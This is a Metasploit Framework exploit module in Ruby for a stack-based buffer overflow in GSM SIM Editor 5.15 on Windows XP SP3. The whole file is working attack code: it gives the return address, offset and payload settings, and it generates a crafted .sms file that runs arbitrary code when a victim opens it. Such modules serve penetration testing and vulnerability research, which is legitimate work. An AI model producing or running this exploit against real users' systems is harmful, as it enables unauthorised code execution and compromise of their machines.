##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking
	
	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'GSM SIM Editor 5.15 Buffer Overflow',
			'Description'     => %q{
					This module exploits a stack-based buffer overflow in GSM SIM Editor 5.15.
				When opening a specially crafted .sms file in GSM SIM Editor a stack-based buffer 
				overflow occurs which allows an attacker to execute arbitrary code.
			},
			'License'         => MSF_LICENSE,
			'Author'          =>
				[
					'Ruben Alejandro',
					'chap0 <contact.chap0[at]gmail.com>',
					'Lincoln <lincoln[at]corelan.be>'
				],
			'References'      =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/14258/' ]
				],
			'DefaultOptions'  =>
				{
					'ExitFunction' => 'process',
				},
			'Platform'        => 'win',
			'Payload'         =>
				{
					'Space' => 2000,
					'BadChars' => "\x00",
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment #add esp, -3500
				},
			'Targets'         =>
				[
					[ 'Windows XP SP3',
						{
							'Ret'    => 0x00405201, # call esp - SIMEditor.exe
							'Offset' => 810
						}
					]
				],
			'Privileged'      => false,
			'DisclosureDate'  => 'Jul 07 2010',
			'DefaultTarget'   => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.', 'msf.sms']),
		 	], self.class)

	end

	def exploit
		buffer =  rand_text_numeric(target['Offset'])
		buffer << [target.ret].pack('V').unpack("H*")[0]
		buffer << make_nops(30).unpack("H*")[0]
		buffer << payload.encoded.unpack("H*")[0]

		file_create(buffer)
	end

end